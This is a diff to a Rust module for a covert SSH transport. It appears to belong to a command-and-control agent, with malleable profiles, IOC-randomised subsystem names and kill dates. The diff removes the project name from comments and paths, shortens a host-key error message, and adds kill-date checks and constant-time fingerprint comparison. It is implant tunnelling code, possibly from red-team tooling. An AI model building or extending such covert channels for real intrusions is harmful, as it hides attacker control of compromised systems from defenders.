@@ -1,5 +1,5 @@
 // Requires russh >= 0.46
-//! SSH covert transport for the Orchestra agent.
+//! SSH covert transport for the agent.
 //!
 //! # Status: EXPERIMENTAL - not recommended for production use.
 //! Enabled only when built with `--features ssh-transport`.
@@ -13,11 +13,11 @@
 //!
 //! The relay SSH server must be configured to accept the compile-time randomised
 //! subsystem (see `common::ioc::IOC_SSH_SUBSYSTEM`) and forward the raw byte
-//! stream to the Orchestra server's agent listener.  A minimal `sshd_config`
+//! stream to the server's agent listener.  A minimal `sshd_config`
 //! stanza is:
 //!
 //! ```text
-//! Subsystem <IOC_SSH_SUBSYSTEM> /usr/local/bin/orchestra-ssh-forwarder
+//! Subsystem <IOC_SSH_SUBSYSTEM> /usr/local/bin/ssh-fwd
 //! ```
 //!
 //! ## Framing
@@ -50,6 +50,7 @@ use async_trait::async_trait;
 use common::config::{MalleableProfile, SshAuthConfig};
 use common::{CryptoSession, Message, Transport};
 use log::info;
+use subtle::ConstantTimeEq;
 use russh::client;
 use russh_keys::key::PublicKey;
 use std::sync::Arc;
@@ -85,12 +86,14 @@ impl client::Handler for ClientHandler {
         let fingerprint = server_public_key.fingerprint();
         match &self.allowed_host_key {
             Some(expected) => {
-                if fingerprint == *expected {
+                // Constant-time comparison to prevent timing side-channel
+                // attacks that could brute-force the expected fingerprint
+                // byte-by-byte.
+                if fingerprint.as_bytes().ct_eq(expected.as_bytes()).into() {
                     Ok(true)
                 } else {
                     log::error!(
-                        "ssh-transport: host key fingerprint mismatch \
-                         (expected {expected}, got {fingerprint}) — rejecting connection"
+                        "ssh-transport: host key fingerprint mismatch — rejecting connection"
                     );
                     Ok(false)
                 }
@@ -108,7 +111,7 @@ impl client::Handler for ClientHandler {
 
 // ── Transport struct ──────────────────────────────────────────────────────────
 
-/// SSH-tunnelled Orchestra transport.
+/// SSH-tunnelled transport.
 ///
 /// Wraps a `russh` client session channel.  Each [`send`] / [`recv`] call
 /// exchanges a single length-prefixed, AES-256-GCM-encrypted frame.
@@ -120,7 +123,7 @@ impl client::Handler for ClientHandler {
 pub struct SshTransport {
     /// Keeps the underlying SSH session alive for the transport's lifetime.
     session: client::Handle<ClientHandler>,
-    /// The session channel carrying Orchestra frames, wrapped as an
+    /// The session channel carrying frames, wrapped as an
     /// `AsyncRead + AsyncWrite` stream.
     stream: russh::ChannelStream<client::Msg>,
     /// Application-layer symmetric session (AES-256-GCM).
@@ -273,7 +276,7 @@ impl SshTransport {
         let channel = handle.channel_open_session().await?;
 
         // Request the compile-time randomised subsystem.  The relay sshd must
-        // map this subsystem to a process or socket that speaks the Orchestra
+        // map this subsystem to a process or socket that speaks the
         // agent protocol (length-prefixed AES-GCM frames).
         channel
             .request_subsystem(true, common::ioc::IOC_SSH_SUBSYSTEM)
@@ -352,6 +355,11 @@ impl Transport for SshTransport {
     /// attempts to re-open it via [`reopen_channel`] before failing, avoiding
     /// a full transport teardown for channel-level errors.
     async fn send(&mut self, msg: Message) -> Result<()> {
+        // Enforce kill date on every send cycle.
+        if !self.profile.kill_date.is_empty() {
+            crate::config::check_kill_date(&self.profile.kill_date)?;
+        }
+
         let serialized = bincode::serialize(&msg)?;
         let ciphertext = self.crypto_session.encrypt(&serialized);
 
@@ -388,6 +396,11 @@ impl Transport for SshTransport {
     /// if the SSH session itself is dead does the error propagate to
     /// `outbound::run_forever` for a full reconnect.
     async fn recv(&mut self) -> Result<Message> {
+        // Enforce kill date on every recv cycle.
+        if !self.profile.kill_date.is_empty() {
+            crate::config::check_kill_date(&self.profile.kill_date)?;
+        }
+
         loop {
             // Attempt to parse a complete frame from the accumulation buffer.
             if self.recv_buf.len() >= 4 {
